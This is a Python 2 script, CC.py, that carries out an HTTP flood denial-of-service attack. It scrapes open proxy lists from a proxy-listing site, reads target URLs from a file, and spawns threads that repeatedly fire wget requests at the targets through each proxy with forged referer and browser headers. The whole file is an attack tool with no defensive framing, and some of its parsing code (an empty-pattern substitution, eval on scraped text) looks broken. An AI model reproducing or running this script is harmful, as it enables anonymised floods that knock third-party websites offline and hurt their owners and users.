#!/usr/bin/python
#-------------------------------------------------------------------------
# Name:        CC.py
#
# Author:      LiuSha
#
# Created:     1/07/2014
# Email:       itchenyi@gmail.com
#-------------------------------------------------------------------------

import urllib2
import re
import os
import threading
import time
import random


class RunCC(threading.Thread):

    def __init__(self, proxy, url):
        threading.Thread.__init__(self)
        self.thread_proxy = proxy
        self.thread_url = url
        self.thread_stop = False

    def run(self):
        while not self.thread_stop:
            os.system("""wget --ignore-length --cache=off --no-http-keep-alive -t 1 --referer="http://www.10086.com" -U 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)' -e "http_proxy=http://%s/" "%s" &""" % (self.thread_proxy, self.thread_url))

    def stop(self):
        self.thread_stop = True


def get_stock_html(URL):
    opener = urllib2.build_opener(
        urllib2.HTTPRedirectHandler(),
        urllib2.HTTPHandler(debuglevel=0),
    )
    opener.addheaders = [
        ('User-agent',
         'Mozilla/4.0 (compatible;MSIE 7.0;'
         'Windows NT 5.1; .NET CLR 2.0.50727;'
         '.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    ]
    url = "http://proxy.com.ru/%s" % URL
    response = opener.open(url)
    return ''.join(response.readlines())


def Getting_Url():
    global CC_Url
    file = open('url', 'r')
    CC_Url = file.readlines()
    file.close()


def Getting_list():
    global IP_Port
    IP_Port = []
    for html_list in re.findall('list_\d+.html', get_stock_html("list_1.html")):
        print "getting %s's IP:PORT" % html_list
        IP_Port += eval(re.sub('', ':', "%s" %
                               re.findall('\d+.\d+.\d+.\d+\d+', get_stock_html(html_list))))


def main():
    global CC_Dict
    CC_Dict = {}
    for i_name in range(len(IP_Port)):
        CC_Dict['Thread%s' % i_name] = "RunCC('%s',r'''%s''')" % (
            IP_Port[i_name], random.choice(CC_Url))
    for k, v in CC_Dict.items():
        k = eval(v)
        k.start()
        time.sleep(0.6)
        k.stop()

if __name__ == '__main__':
    Getting_Url()
    Getting_list()
    main()
